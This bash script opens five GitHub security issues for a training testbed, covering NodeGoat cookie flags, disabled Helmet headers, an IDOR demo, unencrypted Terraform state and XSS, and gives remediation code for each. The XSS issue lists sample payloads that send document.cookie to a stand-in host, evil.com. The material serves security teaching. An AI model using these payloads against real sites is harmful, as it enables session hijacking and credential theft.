#!/bin/bash
# Security Issues Creation Script
# Run with: bash .github/create-security-issues.sh

set -e

echo "Creating security issues for github-security-testbed..."

# Issue 1: Session cookies lack httpOnly and secure flags
gh issue create \
  --title "[Security] NodeGoat: Session cookies lack httpOnly and secure flags" \
  --label "security,vulnerability,high-priority" \
  --assignee "timothywarner" \
  --body "$(cat <<'EOF'
## Description

The NodeGoat application has session cookies configured without critical security flags, making them vulnerable to XSS-based session hijacking.

## Location

`NodeGoat/server.js:78-100`

## Current Code

```javascript
app.use(session({
    secret: cookieSecret,
    saveUninitialized: true,
    resave: true
    // Missing: cookie: { httpOnly: true, secure: true }
}));
```

## Risk

- **Severity**: High
- **OWASP**: A2:2017 - Broken Authentication
- **CWE**: CWE-614 (Sensitive Cookie in HTTPS Session Without Secure Attribute)

## Remediation

Add secure cookie configuration:

```javascript
cookie: {
    httpOnly: true,
    secure: true,
    sameSite: "strict",
    maxAge: 3600000
}
```

## Note

This is intentionally vulnerable for training purposes but should be documented.
EOF
)"

echo "✓ Created issue 1: Session cookies"

# Issue 2: Helmet security middleware disabled
gh issue create \
  --title "[Security] NodeGoat: Helmet security middleware disabled" \
  --label "security,vulnerability,medium-priority" \
  --assignee "timothywarner" \
  --body "$(cat <<'EOF'
## Description

Critical security headers are commented out in the NodeGoat server configuration, leaving the application vulnerable to clickjacking, MIME sniffing, and other attacks.

## Location

`NodeGoat/server.js:38-65`

## Disabled Security Headers

- `helmet.frameguard()` - Clickjacking protection
- `helmet.noCache()` - Cache poisoning protection
- `helmet.contentSecurityPolicy()` - XSS mitigation
- `helmet.hsts()` - HTTPS enforcement
- `nosniff()` - MIME type sniffing protection

## Current Code

```javascript
/*
// Fix for A5 - Security MisConfig
app.disable("x-powered-by");
app.use(helmet.frameguard());
app.use(helmet.noCache());
app.use(helmet.contentSecurityPolicy());
app.use(helmet.hsts());
app.use(nosniff());
*/
```

## Risk

- **Severity**: Medium
- **OWASP**: A6:2017 - Security Misconfiguration
- **CWE**: CWE-693 (Protection Mechanism Failure)

## Remediation

Uncomment and enable helmet middleware with appropriate configuration for the training environment.
EOF
)"

echo "✓ Created issue 2: Helmet middleware"

# Issue 3: IDOR vulnerability in document API
gh issue create \
  --title "[Security] IDOR vulnerability in document API allows unauthorized access" \
  --label "security,vulnerability,high-priority" \
  --assignee "timothywarner" \
  --body "$(cat <<'EOF'
## Description

The IDOR demo application lacks proper authorization checks, allowing users to access documents belonging to other tenants by manipulating document IDs.

## Location

`lesson-01/demo-04-custom-scanners/idor-app/api/documents.js`

## Attack Vector

```bash
# Authenticated as user1, can access user2's documents
GET /api/documents/user2-doc-id
Authorization: Bearer <user1-token>
```

## Risk

- **Severity**: High
- **OWASP**: A1:2017 - Broken Access Control
- **CWE**: CWE-639 (Authorization Bypass Through User-Controlled Key)

## Impact

- Unauthorized access to sensitive documents
- Data breach across tenant boundaries
- Potential for mass data exfiltration via ID enumeration

## Remediation

Add authorization middleware to verify document ownership:

```javascript
const authorizeDocumentAccess = async (req, res, next) => {
  const doc = await Document.findById(req.params.id);
  if (doc.ownerId !== req.user.id) {
    return res.status(403).json({ error: 'Access denied' });
  }
  next();
};
```

## Note

This is intentionally vulnerable for training. Add documentation warning and ensure it's not accidentally deployed.
EOF
)"

echo "✓ Created issue 3: IDOR vulnerability"

# Issue 4: Terraform state encryption
gh issue create \
  --title "[Security] Terraform state may contain sensitive data without encryption" \
  --label "security,infrastructure,medium-priority" \
  --assignee "timothywarner" \
  --body "$(cat <<'EOF'
## Description

The Terraform configuration in lesson-02 does not configure remote state with encryption, potentially exposing infrastructure secrets if state files are stored remotely.

## Location

`lesson-02/demo-04-zero-trust/terraform/main.tf`

## Missing Configuration

The Terraform configuration lacks a backend block with encryption settings:

```hcl
terraform {
  required_version = ">= 1.0.0"
  # Missing: backend with encryption
}
```

## Risk

- **Severity**: Medium
- **CWE**: CWE-312 (Cleartext Storage of Sensitive Information)

## Sensitive Data at Risk

Terraform state files may contain:
- Database passwords
- API keys
- Private IP addresses
- Resource ARNs and IDs

## Remediation

Add backend configuration with encryption:

```hcl
terraform {
  backend "s3" {
    bucket         = "terraform-state-bucket"
    key            = "zero-trust/terraform.tfstate"
    region         = "us-east-1"
    encrypt        = true
    kms_key_id     = "alias/terraform-state-key"
    dynamodb_table = "terraform-locks"
  }
}
```

## Note

For training purposes, consider adding this as a "secure vs insecure" comparison in the lesson materials.
EOF
)"

echo "✓ Created issue 4: Terraform state"

# Issue 5: XSS vulnerabilities via eval() and innerHTML
gh issue create \
  --title "[Security] Critical XSS vulnerabilities via eval() and innerHTML in demo code" \
  --label "security,vulnerability,critical" \
  --assignee "timothywarner" \
  --body "$(cat <<'EOF'
## Description

The vulnerable React demo contains multiple XSS attack vectors including `eval()`, `innerHTML`, and `document.write()` that execute arbitrary JavaScript.

## Locations

`lesson-01/demo-03-xss/vulnerable-react-app/UserProfile.jsx`:

| Line | Vulnerability | Function |
|------|--------------|----------|
| 58 | `innerHTML` assignment | `bioRef.current.innerHTML = bio` |
| 127 | `innerHTML` injection | `getElementById('search-results').innerHTML` |
| 156 | `eval()` code injection | `return eval(calculation)` |
| 165 | `document.write()` | `document.write(template)` |

## Attack Payloads

```javascript
// XSS via bio field
<img src=x onerror="alert(document.cookie)">
<svg onload="fetch('https://evil.com?c='+document.cookie)">

// Code injection via calculator
1+1; fetch('https://evil.com?c='+document.cookie)
1; document.location='https://evil.com?c='+document.cookie

// DOM clobbering + XSS
<form id="search-results"><input name="innerHTML"></form>
```

## Risk

- **Severity**: Critical
- **OWASP**: A7:2017 - Cross-Site Scripting (XSS)
- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)

## Impact

- Session hijacking via cookie theft
- Keylogging and credential theft
- Defacement and phishing
- Malware distribution

## Remediation

See `lesson-01/demo-03-xss/secure-react-app/UserProfile.jsx` for the secure implementation using:
- DOMPurify for HTML sanitization
- `textContent` instead of `innerHTML`
- Safe math parsing instead of `eval()`
- React's built-in XSS protection

## Note

This is the intentionally vulnerable version for training. Ensure clear labeling and never deploy to production environments.
EOF
)"

echo "✓ Created issue 5: XSS vulnerabilities"

echo ""
echo "✅ All 5 security issues created successfully!"
echo "View at: https://github.com/timothywarner-org/github-security-testbed/issues"
